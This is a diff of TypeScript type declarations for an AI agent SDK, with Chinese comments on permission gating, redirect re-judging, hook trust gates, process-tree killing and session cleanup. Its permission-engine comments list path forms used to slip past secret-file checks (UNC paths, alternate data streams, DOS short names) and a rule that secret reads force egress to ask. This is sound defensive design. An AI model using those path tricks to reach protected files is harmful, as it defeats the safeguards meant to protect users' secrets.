      * 返回的 promise 在屏障点执行后兑现;并发调用合流到同一次执行。
      * 未接压缩缝立即拒绝 not_configured;已终态(或排队后直到终态未再经过
      * 屏障点)拒绝 turn_ended——轮与轮之间的手动压缩由装配层直接走
-     * ContextManager.compact(本句柄生命周期只覆盖单轮)。
+     * ContextManager.compact(本句柄生命周期只覆盖单轮);消费方已关闭事件
+     * 迭代器(关闭即取消)拒绝 query_closed。
      * 注意:promise 由事件流消费驱动兑现,须与 events 消费并发等待。
      * 可选能力位:runQuery 恒提供;第三方最小实现(测试假句柄等)可缺省,
      * 消费方以 `handle.compactNow?.()` 探测。
@@ -11905,6 +12227,14 @@ interface GateDecideHints {
      * 旧实现忽略 = 现状(二次咨询照跑;方向不宽,无安全回退面)。
      */
     approvalRedecide?: boolean;
+    /**
+     * 派生目标重判位:工具执行中途得到新目标(WebFetch 3xx Location
+     * 的跳转跳)时对**同一 tool_use_id** 以替换后 args 重判——副作用面跳过与
+     * fallbackRedecide 同律,**分类器咨询恒跳过**(与 approvalRedecide 同律:
+     * 首判已咨询,派生跳只问引擎规则 / egress;ask 由工具按各自纪律处置)。
+     * 旧实现忽略 = 复跑完整门(方向不宽,无安全回退面)。
+     */
+    derivedTargetRedecide?: boolean;
 }
 /** 权限门:调度器在每次工具执行前调用 decide,取 allow / deny / ask 结构化决策。 */
 interface PermissionGate {
@@ -12182,6 +12512,14 @@ interface ToolContext {
      * 与索引写后体检。缺省 = 门关,工具行为与现状逐字节一致。
      */
     memoryWrite?: MemoryWriteContext;
+    /**
+     * 派生目标重裁缝:工具在执行中途得到**新的目标**(WebFetch 的 3xx
+     * Location、后续同类派生面)时,以替换后的 args 请求门对**同一 tool_use_id** 重裁——
+     * 调度器注入为 `gate.decide({...call, args}, { derivedTargetRedecide: true })`(同一
+     * gate、跳过副作用面与裁决人咨询,只走引擎规则 / egress 判定)。可选——直调 / 无门
+     * 执行器缺省时工具按各自纪律 fail-closed(WebFetch:跨域跳转一律拒)。
+     */
+    readjudicate?: (args: Record<string, unknown>) => GateDecision | Promise<GateDecision>;
 }
 /** 工具结果的单个内容块:文本,或 base64 编码的图片。 */
 type ToolResultContent = {
@@ -12219,8 +12557,22 @@ interface Tool<Args = unknown> {
      * (请求字节与现状逐字节一致)。执行语义与本字段无关。
      */
     shortDescription?: string;
-    /** 参数 schema(zod;经 zod-to-json-schema 或手写 JSON Schema 暴露给模型由网关层处理) */
+    /**
+     * 参数 schema(zod;经 zod-to-json-schema 或手写 JSON Schema 暴露给模型由网关层处理)。
+     * 兑现点在调度器:每次调用执行前按本 schema 校验(见 `argsValidation`),不合法即以
+     * `invalid_args` 结构化失败回填模型、`execute` 不被调用。校验只作门:通过后权限裁决与
+     * `execute` 见到的仍是调用方给出的同一个原参对象(缺省值补齐、schema 外键剥除、
+     * `.transform()` 产物均不下行);需要解析产物的工具在 `execute` 内自行 parse——这是
+     * 既有约定,含非幂等 transform 的 schema 因此合法。
+     */
     inputSchema: z.ZodType<Args>;
+    /**
+     * 入参校验归属。缺省(`undefined` / `'dispatcher'`)= 调度器按 `inputSchema` 中央校验;
+     * `'remote'` = 本地不校验、原参透传,由远端按其自身契约裁定——用于 `inputSchema`
+     * 只是远端契约宽松投影的桥接工具(MCP 服务端工具),避免本地 schema 把远端
+     * 可接受的参数拦在门外。
+     */
+    argsValidation?: 'dispatcher' | 'remote';
     /** 只读工具可并发、可在 plan 模式放行(声明即契约,调度器强制) */
     isReadOnly: boolean;
     /**
@@ -12743,8 +13095,13 @@ declare class PermissionEngine {
     /** TMEM/1 carve-out(4.95 段):canonical + 大小写折叠后的记忆目录集;空集 = 缝不在场 */
     private readonly memoryCarveOutDirs;
     private readonly memoryCarveOutCaseInsensitive;
-    /** hard-safety 追加面(内置子集恒启用,本配置只追加 egress/审计目录) */
+    /** hard-safety 追加面(内置子集恒启用,本配置只追加 egress/审计目录 + 宿主 shell) */
     private readonly hardSafetyConfig;
+    /**
+     * 宿主 shell 方言:缺省跟随执行器实际派生的 shell(detectHostShell
+     * 单一事实源),Shell 命令词法 / 结构树 / hard-safety / 分类器事实全部同一方言。
+     */
+    private readonly hostShell;
     /** 会话污点(跨调用窄实现):秘密面被读取后置真,egress/publish 恒 ask */
     private secretTainted;
     /** LLM 权限分类器(OPT-18;缺省不注入 = 无分类器路径) */
@@ -12764,6 +13121,8 @@ declare class PermissionEngine {
     private classifierCacheMisses;
     constructor(config?: PermissionEngineConfig);
     getMode(): PermissionMode;
+    /** 词法选项(宿主 shell 方言)——resolveTarget / 结构树 / 分类器事实同一份 */
+    private get lexOptions();
     setMode(mode: PermissionMode): void;
     /**
      * 调度器在用户选择"本会话总是允许/拒绝"后回写。
@@ -12811,10 +13170,10 @@ declare class PermissionEngine {
      */
     private readOnlyShellVerdict;
     /**
-     * 秘密探针(R0 内容/搜索面实参):
-     * - 'blocked':不可规范解析(UNC、ADS 冒号、DOS 短名 `~N`、控制字符)
-     *   或解析后出工作区——调用方整条回落原链(fail-to-ask,不猜测语义;
-     *   工作区包含与路径工具 R0 同一红线纪律);
+     * 秘密探针(R0 内容/搜索面实参;路径归一走 path-arg.ts 单点,与 fast-path / allow 同源):
+     * - 'blocked':不可规范解析(UNC、ADS 冒号、DOS 短名 `~N`、控制字符、盘符相对、
+     *   尾点/尾空格、设备名、`~` 家目录)或解析后出工作区——调用方整条回落原链
+     *   (fail-to-ask,不猜测语义;工作区包含与路径工具 R0 同一红线纪律);
      * - 'secret':命中基线秘密面(Read 探身走 matchBaseline,口径与
      *   FastPathGuard.isProtectedContentPath 一致——含例外/配置 allow 中和,
      *   基线关闭或整体替换时随之放行/改判,用户显式决策优先);
@@ -13528,7 +13887,13 @@ interface SegmentationOptions {
 
 /** 核警告(store 层经 onStoreWarning / turn.error 等出线;码集加法) */
 interface SessionStoreCoreWarning {
-    code: 'store_prefix_mismatch' | 'store_pending_rewrite';
+    /**
+     * store_seal_failed:RF-06 追加已落盘但封段句柄失败(记录保留不重写,游标缓存作废)。
+     * store_unknown_kinds:RFC-RF-2 C(RF-J1)全量读到词表外 kind(model=false)记录——已留档跳过、
+     * 链完好,只不进 messages;detail { sessionId, unknownKinds, warnings }。两店经既有 onStoreWarning 出线,
+     * 不新造通道;宿主未接 onStoreWarning 则静默(读本身照常成功)。
+     */
+    code: 'store_prefix_mismatch' | 'store_pending_rewrite' | 'store_seal_failed' | 'store_unknown_kinds';
     message: string;
     detail?: Record<string, unknown>;
 }
@@ -14406,6 +14771,28 @@ interface CheckpointRetention {
  */
 declare const CHECKPOINT_EXPORT_FORMAT: "tansr-checkpoint/1";
 
+/** 上下文预算的只读本地估算，与模型返回的计费用量分别表示。 */
+
+/** 可序列化的上下文预算快照；null 表示未知，本地估算不代表平台计费用量。 */
+interface ContextBudgetState {
+    physicalWindowTokens: number | null;
+    effectiveWindowTokens: number | null;
+    estimatedInputTokens: number;
+    outputReserveTokens: number;
+    thinkingReserveTokens: number | null;
+    remainingTokens: number | null;
+    fits: boolean | null;
+    thresholds: {
+        microcompactAt: number;
+        warningAt: number;
+        autoCompactAt: number;
+        blockingAt: number;
+        summaryReserveTokens: number;
+    } | null;
+    source: 'local_estimate';
+    settingsSource: 'model' | 'configured' | 'external_manager' | 'unknown';
+}
+
 /**
  * 交互通道抽象:AskUser 工具与表面层之间的依赖注入缝。
  *
@@ -15219,6 +15606,33 @@ declare const ImageGenArgsSchema: z.ZodObject<{
 }>;
 /** ImageGen 工具的已校验参数类型(ImageGenArgsSchema 推导)。 */
 type ImageGenArgs = z.infer<typeof ImageGenArgsSchema>;
+
+/** 按汉字 2、其他 Unicode 码点 1 估算语音输入字符数；实际计费量以平台结果为准。 */
+declare function countSpeechCharacters(input: string): number;
+/** 已通过本地校验的朗读文本、加权字符数、每段上限及按原顺序排列的文本片段。 */
+interface SpeechInputPlan {
+    text: string;
+    estimatedCharacters: number;
+    maxCharacters: number;
+    segments: string[];
+}
+/** 朗读准备结果；拒绝时返回原因、估算字符数及已知上限，不调用语音服务。 */
+type SpeechInputPlanResult = {
+    status: 'ready';
+    plan: SpeechInputPlan;
+} | {
+    status: 'rejected';
+    reason: 'empty_input' | 'unknown_limit' | 'invalid_configuration' | 'input_too_large' | 'segmentation_required' | 'segment_limit';
+    estimatedCharacters: number;
+    maxCharacters: number | null;
+};
+/** 去除首尾空白后校验朗读文本，仅显式允许时按 Unicode 码点完整分段；每段同时遵守模型加权帽与请求体的 20000 UTF-16 单元帽，不调用计费端点。 */
+declare function planSpeechInput(input: string, options?: {
+    maxCharacters?: number;
+    segment?: boolean;
+    maxTotalCharacters?: number;
+    maxSegments?: number;
+}): SpeechInputPlanResult;
 
 /**
  * MCP 结构化错误。
@@ -16898,6 +17312,7 @@ declare const MergedTansrConfigSchema: z.ZodObject<{
                 modelsEndpoint: z.ZodOptional<z.ZodBoolean>;
                 minTimeoutMs: z.ZodOptional<z.ZodNumber>;
                 maxTokensExcludesReasoning: z.ZodOptional<z.ZodBoolean>;
+                reasoningTokens: z.ZodOptional<z.ZodEnum<["subset_of_output", "separate"]>>;
             }, "strip", z.ZodTypeAny, {
                 stopSequences?: "ignored" | "honored" | "misreported_end_turn" | undefined;
                 unknownModelFallback?: boolean | undefined;
@@ -16908,6 +17323,7 @@ declare const MergedTansrConfigSchema: z.ZodObject<{
                 modelsEndpoint?: boolean | undefined;
                 minTimeoutMs?: number | undefined;
                 maxTokensExcludesReasoning?: boolean | undefined;
+                reasoningTokens?: "subset_of_output" | "separate" | undefined;
             }, {
                 stopSequences?: "ignored" | "honored" | "misreported_end_turn" | undefined;
                 unknownModelFallback?: boolean | undefined;
@@ -16918,6 +17334,7 @@ declare const MergedTansrConfigSchema: z.ZodObject<{
                 modelsEndpoint?: boolean | undefined;
                 minTimeoutMs?: number | undefined;
                 maxTokensExcludesReasoning?: boolean | undefined;
+                reasoningTokens?: "subset_of_output" | "separate" | undefined;
             }>>;
             hostedTools: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
             background: z.ZodOptional<z.ZodBoolean>;
@@ -16970,6 +17387,7 @@ declare const MergedTansrConfigSchema: z.ZodObject<{
                 modelsEndpoint?: boolean | undefined;
                 minTimeoutMs?: number | undefined;
                 maxTokensExcludesReasoning?: boolean | undefined;
+                reasoningTokens?: "subset_of_output" | "separate" | undefined;
             } | undefined;
             hostedTools?: string[] | undefined;
             background?: boolean | undefined;
@@ -17022,6 +17440,7 @@ declare const MergedTansrConfigSchema: z.ZodObject<{
                 modelsEndpoint?: boolean | undefined;
                 minTimeoutMs?: number | undefined;
                 maxTokensExcludesReasoning?: boolean | undefined;
+                reasoningTokens?: "subset_of_output" | "separate" | undefined;
             } | undefined;
             hostedTools?: string[] | undefined;
             background?: boolean | undefined;
@@ -17082,6 +17501,7 @@ declare const MergedTansrConfigSchema: z.ZodObject<{
                 modelsEndpoint?: boolean | undefined;
                 minTimeoutMs?: number | undefined;
                 maxTokensExcludesReasoning?: boolean | undefined;
+                reasoningTokens?: "subset_of_output" | "separate" | undefined;
             } | undefined;
             hostedTools?: string[] | undefined;
             background?: boolean | undefined;
@@ -17154,6 +17574,7 @@ declare const MergedTansrConfigSchema: z.ZodObject<{
                 modelsEndpoint?: boolean | undefined;
                 minTimeoutMs?: number | undefined;
                 maxTokensExcludesReasoning?: boolean | undefined;
+                reasoningTokens?: "subset_of_output" | "separate" | undefined;
             } | undefined;
             hostedTools?: string[] | undefined;
             background?: boolean | undefined;
@@ -17303,12 +17724,12 @@ declare const MergedTansrConfigSchema: z.ZodObject<{
             /** 活段记录数阈值(缺省 kernel DEFAULT_SEGMENT_MAX_RECORDS = 5000) */
             maxRecords: z.ZodOptional<z.ZodNumber>;
         }, "strip", z.ZodTypeAny, {
-            enabled?: boolean | undefined;
             maxBytes?: number | undefined;
+            enabled?: boolean | undefined;
             maxRecords?: number | undefined;
         }, {
-            enabled?: boolean | undefined;
             maxBytes?: number | undefined;
+            enabled?: boolean | undefined;
             maxRecords?: number | undefined;
         }>>;
         /**
@@ -17336,8 +17757,8 @@ declare const MergedTansrConfigSchema: z.ZodObject<{
         checkpointsDir?: string | undefined;
         autoCheckpointBeforeCompact?: boolean | undefined;
         segmentation?: {
-            enabled?: boolean | undefined;
             maxBytes?: number | undefined;
+            enabled?: boolean | undefined;
             maxRecords?: number | undefined;
         } | undefined;
     }, {
@@ -17349,8 +17770,8 @@ declare const MergedTansrConfigSchema: z.ZodObject<{
         checkpointsDir?: string | undefined;
         autoCheckpointBeforeCompact?: boolean | undefined;
         segmentation?: {
-            enabled?: boolean | undefined;
             maxBytes?: number | undefined;
+            enabled?: boolean | undefined;
             maxRecords?: number | undefined;
         } | undefined;
     }>>;
@@ -17424,6 +17845,7 @@ declare const MergedTansrConfigSchema: z.ZodObject<{
                 modelsEndpoint?: boolean | undefined;
                 minTimeoutMs?: number | undefined;
                 maxTokensExcludesReasoning?: boolean | undefined;
+                reasoningTokens?: "subset_of_output" | "separate" | undefined;
             } | undefined;
             hostedTools?: string[] | undefined;
             background?: boolean | undefined;
@@ -17691,8 +18113,8 @@ declare const MergedTansrConfigSchema: z.ZodObject<{
         checkpointsDir?: string | undefined;
         autoCheckpointBeforeCompact?: boolean | undefined;
         segmentation?: {
-            enabled?: boolean | undefined;
             maxBytes?: number | undefined;
+            enabled?: boolean | undefined;
             maxRecords?: number | undefined;
         } | undefined;
     } | undefined;
@@ -17883,6 +18305,7 @@ declare const MergedTansrConfigSchema: z.ZodObject<{
                 modelsEndpoint?: boolean | undefined;
                 minTimeoutMs?: number | undefined;
                 maxTokensExcludesReasoning?: boolean | undefined;
+                reasoningTokens?: "subset_of_output" | "separate" | undefined;
             } | undefined;
             hostedTools?: string[] | undefined;
             background?: boolean | undefined;
@@ -18021,8 +18444,8 @@ declare const MergedTansrConfigSchema: z.ZodObject<{
         checkpointsDir?: string | undefined;
         autoCheckpointBeforeCompact?: boolean | undefined;
         segmentation?: {
-            enabled?: boolean | undefined;
             maxBytes?: number | undefined;
+            enabled?: boolean | undefined;
             maxRecords?: number | undefined;
         } | undefined;
     } | undefined;
@@ -18048,7 +18471,16 @@ type MergedTansrConfig = z.infer<typeof MergedTansrConfigSchema>;
  * (AGENTS.md「工具只产出结构化数据」铁律;键清单见任务报告)。
  */
 
-/** 配置层名(与权限引擎的 RuleLayerName 是两套概念,映射见 permissions.ts) */
+/**
+ * 配置层名(与权限引擎的 RuleLayerName 是两套概念,映射见 permissions.ts)。
+ *
+ * RF-06(RV-1-07)分层口径澄清:本词表只建模**五个文件层**(sources / captureLayers /
+ * 诊断归因的「层」恒取自此)。**env 与运行参数不是层,是段律**——某段能否被 env 覆盖、
+ * 覆盖方向(整体接管 / 只能收紧 / 无)由 `section-policy.ts` 的 `SectionEnvRule` 逐段
+ * 单表表达,env 压不过 managed 地板时以 `env-suppressed` 归因(`sandbox-section.ts`);
+ * 远程 org 下发是 cli remote-settings 叠加的半层(`HttpSectionLayer` 等的 'remote' 只作
+ * 生效值来源标签,不入本词表)。两张表(文件层 × 段 env 律)分工如上,不是并存的两套层。
+ */
 type ConfigLayerName = 'managed' | 'projectLocal' | 'projectShared' | 'user' | 'builtin';
 type ConfigDiagnosticSeverity = 'error' | 'warning' | 'info';
 type ConfigDiagnosticCode = 
@@ -18706,8 +19138,12 @@ interface PricingUpdate {
  * - 外部 AbortSignal → 杀进程,计 aborted(整批取消场景)。
  *
  * 超时与外部信号经 withTimeout 合成一条信号贯穿(与 Http 工具同法);
- * 进程终止用 kill(SIGTERM)+ 宽限后 SIGKILL 两段——hook 进程约定为单进程
- * 短任务,不做 Shell 工具级的进程树击杀(那套为交互式 shell 深树设计)。
+ * 进程终止为**整树击杀**两段(RF-10 · RV-2-08):POSIX 以 detached 启动使 hook
+ * 成为进程组组长,终止时 SIGTERM 发给整组、宽限后 SIGKILL 整组;Windows 无软
+ * 信号,taskkill /PID /T /F 按父子链整树硬杀(与 tools/shell/executor、
+ * tools/mcp/stdio-transport 同法)。改造前只 kill hook 本进程:hook 脚本派生的
+ * 后台孙进程(`cmd &`、守护进程)在超时后成为孤儿续跑,timeoutMs 的资源承诺
+ * 失效。自行 setsid 脱组(POSIX)的守护进程超出进程组语义,属已知边界。
  *
  * 注入缝(两个,择一):
  * - spawn(Q4-7 执行世界 SpawnLike,经 hook 引擎构造参数注入;缺省
@@ -18717,6 +19153,11 @@ interface PricingUpdate {
  *   冒烟用 process.execPath -e 短脚本单独覆盖。两者同时注入时 spawn 优先。
  */
 
+/**
+ * 树杀原语签名(注入缝;缺省 defaultHookKillTree)。groupOwned = 子进程以
+ * detached 启动、是自己进程组的组长(POSIX 整组信号的前提;Windows 恒 false)。
+ */
+type HookKillTree = (child: SpawnedProcessLike, signal: 'SIGTERM' | 'SIGKILL', groupOwned: boolean) => void;
 type SpawnImpl = typeof spawn;
 interface CommandHookRunnerOptions {
     /**
@@ -18730,6 +19171,10 @@ interface CommandHookRunnerOptions {
     env?: Record<string, string | undefined>;
     /** exit→close 兜底宽限毫秒(K-1;缺省 EXIT_CLOSE_GRACE_MS,测试注入短值) */
     exitCloseGraceMs?: number;
+    /** 树杀原语注入缝(缺省 defaultHookKillTree;测试记录信号序而不触真实 taskkill/组信号) */
+    killTree?: HookKillTree;
+    /** SIGTERM → SIGKILL 宽限毫秒(缺省 KILL_GRACE_MS,测试注入短值) */
+    killGraceMs?: number;
 }
 
 interface HttpHookRunnerOptions {
@@ -18754,6 +19199,20 @@ interface HttpHookRunnerOptions {
      * 配置后(含空数组)引用名单外变量按错误处理(企业 managed 层锁定用)。
      */
     allowedHeaderEnvVars?: readonly string[];
+    /**
+     * allowlist 谓词(信任维度接缝):对每个 `${VAR}` 引用以变量名与语境
+     * (header 名、hook 来源层)问一次,false = 按「名单外」处理(不解析、不出网、
+     * 错误消息不含值)。与数组 allowlist 叠加只收紧(两者皆放行才替换);缺省不问 =
+     * 现状零行为变更。「项目层 `${VAR}` 一律不展开」之类的信任门由装配层注入本谓词实现。
+     */
+    headerEnvVarAllowed?: HeaderEnvVarPredicate;
+    /**
+     * 是否展开 `${VAR}` 整值引用(RF-02b 信任门缝):false = **原样字面量发送**——不读 env、
+     * 不进 allowlist 裁决、不拒发(仓库可控的项目层配置永不读取宿主环境,又不因 `${VAR}`
+     * 写法而失去 hook 本身);缺省恒 true = 现状。与 headerEnvVarAllowed 的区别:后者是
+     * 「拒发」,本谓词是「不展开」。
+     */
+    expandHeaderEnvRefs?: (context: HeaderEnvVarContext) => boolean;
     /** 显式允许私网/环回端点(默认拒绝;企业内网 hook 端点场景) */
     allowPrivateUrls?: boolean;
     /**
@@ -18762,6 +19221,15 @@ interface HttpHookRunnerOptions {
      */
     lookupImpl?: HostAddressLookup;
 }
+/** header `${VAR}` 引用的裁决语境 */
+interface HeaderEnvVarContext {
+    /** 引用所在 header 名(配置原文) */
+    header: string;
+    /** hook 来源层(引擎透传 HookEntry.layer;直调缺省) */
+    layer?: ConfigLayerName;
+}
+/** allowlist 谓词:(变量名, 语境) → 是否允许解析 */
+type HeaderEnvVarPredicate = (varName: string, context: HeaderEnvVarContext) => boolean;
 
 /**
  * HookEngine:匹配 → 并行执行 → 按配置优先级稳定排序应用。
@@ -18808,16 +19276,43 @@ interface HookEngineOptions {
     command?: CommandHookRunnerOptions;
     /** http 执行体注入缝 */
     http?: HttpHookRunnerOptions;
+    /**
+     * 按层启用谓词(信任维度接缝):对每个候选条目以其来源层
+     * (`HookEntry.layer`)问一次,false = 该条目本次不参与(不匹配、不签发
+     * hook.triggered、不执行、不进 executions;`hasHooks` 同口径)。缺省恒 true =
+     * 现状零行为变更。信任门(如工作区未信任 → 项目层关)由装配层注入,
+     * 引擎自身不持有任何信任状态。
+     */
+    layerEnabled?: HookLayerPredicate;
+}
+/** 按层启用谓词:(来源层, 条目) → 本次是否参与 */
+type HookLayerPredicate = (layer: ConfigLayerName, entry: HookEntry) => boolean;
+/** 按层视图的单层计数(已装配条目数 / 当前谓词下启用数) */
+interface HookLayerCount {
+    registered: number;
+    enabled: number;
 }
 interface HookRunOptions {
     /** 外部取消信号(整批 hook 一起取消) */
     signal?: AbortSignal;
+    /**
+     * 本次触发的条目筛选谓词(RF-02b):与 layerEnabled 叠加只收紧(未选中 = 不签发
+     * triggered、不执行)。装配层用它**补发**一次此前被信任门挡下的项目层 SessionStart
+     * 而不重跑其余层;缺省全选。`hasHooks` 同口径。
+     */
+    select?: (entry: HookEntry) => boolean;
 }
 declare class HookEngine {
     #private;
     constructor(options: HookEngineOptions);
     /** 事件是否有已注册且命中的 hook(调用方可先探测再组装载荷) */
-    hasHooks(event: HookEventName, matchValue?: string): boolean;
+    hasHooks(event: HookEventName, matchValue?: string, options?: Pick<HookRunOptions, 'select'>): boolean;
+    /**
+     * 按层视图:各来源层已装配的条目数与当前谓词下的启用数(仅列有条目的层;
+     * 缺省谓词下 enabled 恒等于 registered)。event 缺省 = 全事件汇总。装配层据此可
+     * 呈现「N 条项目层 hooks 待信任裁决」一类提示,不必自行遍历 LoadedHooks。
+     */
+    layerView(event?: HookEventName): Partial<Record<ConfigLayerName, HookLayerCount>>;
     /**
      * 触发一次事件:命中 hook 并行执行,结果按配置优先级稳定排序应用。
      * 引擎自身永不 throw 业务错误——一切失败降级为 execution.status(fail-open)。
@@ -19301,10 +19796,9 @@ type ImageInputMode = InputModalityMode;
  *   400);门关或非 user 角色 **恒硬错**(throw TwpImageWireError,整次
  *   请求不发出不计费)——wire 层是最后防线不是降级点,旧「静默剥图照发
  *   文本」径已废除(doc/51 原则 5「降级恒显式」;显式拒绝的用户呈现半边
- *   在 TUI 发送谓词前门)。tool_result 内嵌图片项恒占位降级
- *   [image omitted: <mime>]——api TwpToolResultBlock.v 未扩,CW3 后
- *   敞口,见 doc/49 CW3 候排项②「tool_result 内嵌图片 twp 径恒占位(api
- *   契约扩展)」;占位实态由 CW3 M6 E2E(cli test/wire/twp-image-e2e)锁定;
+ *   在 TUI 发送谓词前门)。OBS-07:tool_result 内嵌图片保留文字锚点，
+ *   字节提升到全部工具结果之后的 user 图片消息；沿用既有 image-input
+ *   词表和能力门，不扩展 tool_result.v，也不静默剥图。
  * - thinking/opaque 无 twp/1 v1 载荷位:出线丢弃(方言差异收敛在网关,
  *   服务端按各厂商 must_echo_back 语义回填;载荷位扩展属 twp/1 v2 双侧
  *   契约议题——CW3 后敞口,销账登记见 doc/report/CW3-M6 终报);
@@ -20253,13 +20747,20 @@ interface SessionStore {
 /**
  * `AgentSession.drain()` 的选项:`timeoutMs` 观察预算(缺省 30 秒;Infinity = 不限)、`signal` 只取消
  * 观察者不取消共享工作、`flushStore` 是否顺带调用借用 store 的全局 flush、`retryPersistence` 是否
- * 重试此前失败的持久化提交。
+ * 重试此前失败的持久化提交、`force` 观察预算耗尽后是否强制释放自有资源(见字段说明)。
  */
 interface SessionDrainOptions {
     timeoutMs?: number;
     signal?: AbortSignal;
     flushStore?: boolean;
     retryPersistence?: boolean;
+    /**
+     * 已关闭会话的收尾观察在 `timeoutMs` 内未确认(适配器违约:settle 回 pending>0 / 超时,或收尾仍在飞)时,
+     * 强制释放自有资源(会话级 MCP host 等)并以结构化失败(`*_settlement_incomplete` / `*_settlement_forced`)
+     * 交付,再以同一预算等待释放完成。缺省 false = 只观察不强制(既有语义:未确认即不关自有资源)。
+     * 对未关闭的会话无效。
+     */
+    force?: boolean;
 }
 /** 生命周期失败发生的阶段(查询环 / 空闲操作 / 存储提交 / 历史回调 / cwd 提交 / store flush / MCP 关闭 / 装配回滚) */
 type SessionLifecyclePhase = 'query' | 'idle_operation' | 'store_commit' | 'history_callback' | 'cwd_commit' | 'store_flush' | 'mcp_close' | 'assembly_rollback';
@@ -20293,9 +20794,12 @@ interface SessionDrainResult {
         level: 'transport-completion' | 'connector-close-promise';
     }[];
 }
-/** 可等待清理完成的句柄(`SdkLifecycleError.cleanup` 携带;`drain()` 等待在飞释放并返回结果) */
+/**
+ * 可等待清理完成的句柄(`SdkLifecycleError.cleanup` 携带;`drain()` 等待在飞释放并返回结果;
+ * `force` 语义同 `SessionDrainOptions.force`:收尾观察预算耗尽后强制释放自有资源)
+ */
 interface SdkCleanupHandle {
-    drain(options?: Pick<SessionDrainOptions, 'timeoutMs' | 'signal'>): Promise<SessionDrainResult>;
+    drain(options?: Pick<SessionDrainOptions, 'timeoutMs' | 'signal' | 'force'>): Promise<SessionDrainResult>;
 }
 /** 诊断可滚动淘汰；各阶段未修复失败事实独立保留，不因窗口滚动消失。 */
 declare class LifecycleLedger {
@@ -21516,7 +22020,7 @@ interface AssembleToolingOptions {
     tools?: SdkToolsOptions;
     /** 能力位档;缺省 DEFAULT_APP_CAPABILITIES(令牌档由 bundle 供给) */
     capabilities?: AppCapabilities;
-    /** 环3 平台工具材料(令牌档由 createSession/query 注入,其余档恒缺席) */
+    /** 系统工具的平台提供方材料(令牌档由 createSession/query 注入,其余档恒缺席) */
     platformContext?: PlatformToolContext;
     /** skills 注入(受 skills 能力位——位关而材料在场 fail-fast) */
     skills?: SdkSkillsOptions;
@@ -21525,6 +22029,20 @@ interface AssembleToolingOptions {
     /** AskUser 工具交互通道;缺省 UnavailableChannel(结构化降级,不挂起) */
     promptChannel?: PromptChannel;
     permission?: PermissionOptions;
+    /**
+     * 项目层 hooks 信任门(托管档)。缺席 / false = 工作区 `.tansr/settings.json` 与 `settings.local.json`
+     * 声明的 command / http hooks 不启用、零执行(user 层 / managed 层 hooks 照常);true = 宿主代表用户为该
+     * 工作区授信,项目层 hooks 照跑。SDK 不持久化信任、不读取命令行工具的工作区信任记录——授信事实由宿主
+     * 自行掌握并逐次传入。门住的项目层 hooks 在场时经 `warn` 通报一次 `project_hooks_untrusted`(sdk 源,
+     * `detail.registered` = 各项目层被门住的条目数)。注入档(loaded 为 null)无 hooks,本项无效。
+     */
+    trustProjectHooks?: boolean;
+    /**
+     * 权限引擎 Shell 命令词法方言(kernel `HostShell`:'posix' | 'powershell')。缺席随平台(kernel
+     * `detectHostShell()`,与内置 Shell 工具实际派生的 shell 一致);显式值供测试或跨平台装配演练——与真实
+     * 执行 shell 错配会让命令词法守卫与执行环境脱节,生产宿主不应设置。
+     */
+    hostShell?: HostShell;
     /**
      * 裁决人:kernel 分类器配置 + 生效姿态 + 生效资格档(assembleBundleAdjudicator 产物三件,治理旋钮已叠加)。
      * 在场即 PermissionEngine({ mode: modeUnderAdjudicator({ posture, tier }), classifier })——模式由 kernel
@@ -22205,15 +22723,18 @@ declare class TansrSdkError extends Error {
 
 /**
  * 生命周期收口失败(`lifecycle_failed` / 装配期 `assembly_failed`):`failures` 逐项列出失败阶段与码,
- * `errors` 为对应原始错误;`cleanup` 在场时可再次调用以继续回收未收口的资源。
+ * `errors` 为对应原始错误;`cleanup` 在场时可再次调用以继续回收未收口的资源;`result` 在场时为
+ * 消费者已拿到的自然终态(`query()` 收尾失败 / 超时不整体替换已完成的 QueryResult,附诊断交付)。
  */
 declare class SdkLifecycleError extends TansrSdkError {
     readonly failures: readonly SessionLifecycleFailure[];
     readonly errors: readonly unknown[];
     readonly cleanup: SdkCleanupHandle | undefined;
+    readonly result: QueryResult | undefined;
     constructor(code: 'lifecycle_failed' | 'assembly_failed', failures: readonly SessionLifecycleFailure[], options?: {
         cause?: unknown;
         cleanup?: SdkCleanupHandle;
+        result?: QueryResult;
     });
 }
 
@@ -22237,8 +22758,11 @@ interface ManagedQueryOptions extends QueryLifecycleOptions {
     system?: IRSystemSegment[];
     /** 业务段选定后追加的宿主指南，不触发平台默认覆盖；权限与工具指南仍独立装配。 */
     systemAppend?: IRSystemSegment[];
-    /** app_user 短期令牌(开发者服务端换发;模型与能力位由 bundle 供给) */
-    token?: string;
+    /**
+     * app_user 短期令牌(开发者服务端换发;模型与能力位由 bundle 供给)。亦可传 getter(`() => currentToken`):
+     * 每个平台请求发起时取现值,令牌轮换后长跑 query 自动携新令牌;getter 须回非空字符串。
+     */
+    token?: string | (() => string);
     /** 平台 API 基址(令牌档必填,如 https://api.example.com) */
     baseUrl?: string;
     /**
@@ -22332,6 +22856,20 @@ declare function accumulateUsage(total: IRUsage | undefined, next: IRUsage): IRU
  * 错误天然异步,在首次 next() 以 TansrSdkError('assembly_failed') reject。
  */
 declare function query(options: QueryOptions): AsyncGenerator<KernelEvent, QueryResult, undefined>;
+
+/** 新一轮用户图文输入的类型和校验。 */
+
+/** 可提交到新一轮会话的文本或内嵌 Base64 图片块。 */
+type SessionUserBlock = Extract<IRBlock, {
+    t: 'text' | 'image';
+}>;
+/** 图文提交结果；started 表示新轮已启动，rejected 表示未接收并说明原因。 */
+type SendBlocksResult = {
+    status: 'started';
+} | {
+    status: 'rejected';
+    reason: 'turn_running' | 'operation_running' | 'empty_input' | 'invalid_blocks' | 'invalid_image' | 'image_too_large' | 'context_budget_exceeded';
+};
 
 /**
  * 媒体异步任务客户端(四面媒体工具共用):
@@ -22463,7 +23001,7 @@ type CreateSpeechToTextToolOptions = CreatePlatformSpeechToTextProviderOptions &
     token: string;
 };
 /**
- * 环3 平台语音转文字工具 = kernel SpeechToText 骨架 + 平台提供方(name 'tansr')。计费副作用真实
+ * 系统语音转文字工具 = kernel SpeechToText 骨架 + 平台提供方(name 'tansr')。计费副作用真实
  * 存在(按音频秒/音频 token 扣 App 余额)——骨架恒不声明只读/并发安全。
  */
 declare function createSpeechToTextTool(options: CreateSpeechToTextToolOptions): Tool<SpeechToTextArgs>;
@@ -22492,7 +23030,7 @@ type CreateTextToSpeechToolOptions = CreatePlatformTextToSpeechProviderOptions &
     token: string;
 };
 /**
- * 环3 平台文字转语音工具 = kernel TextToSpeech 骨架 + 平台提供方(name 'tansr')。计费副作用真实
